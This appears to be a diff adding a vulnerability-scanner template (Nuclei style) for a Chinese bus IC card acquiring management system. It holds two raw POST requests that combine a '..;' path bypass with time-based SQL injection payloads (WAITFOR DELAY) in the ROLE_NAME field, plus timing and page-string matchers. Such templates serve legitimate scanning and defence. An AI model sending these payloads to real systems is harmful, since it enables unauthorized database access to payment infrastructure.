@@ -1,0 +1,37 @@
+id: poc-yaml-bus-ic-card-ams-role-sqli
+info:
+  name: "公交IC卡收单管理系统 role SQL注入"
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: 公交IC卡收单管理系统
+
+http:
+  - raw:
+      - |
+        POST /assets/..;/role HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        _search=false&nd=1727245571646&rowCountPerPage=10&pageNo=1&sidx=ROLE_NAME&sord=asc&method=select&ROLE_NAME=1');WAITFOR DELAY '0:0:5'--
+      - |
+        POST /assets/..;/role HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        _search=false&nd=1727245571646&rowCountPerPage=10&pageNo=1&sidx=ROLE_NAME&sord=asc&method=select&ROLE_NAME=1');WAITFOR DELAY '0:0:8'--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "window.top.window.jQuery"
+          - "(\"#temporary_iframe_id\")"
+          - "超级管理员"
+        condition: and
+      - type: dsl
+        dsl:
+          - 'duration_1>=5 && duration_1<=6'
+          - 'duration_2 - duration_1 >2'
+        condition: and
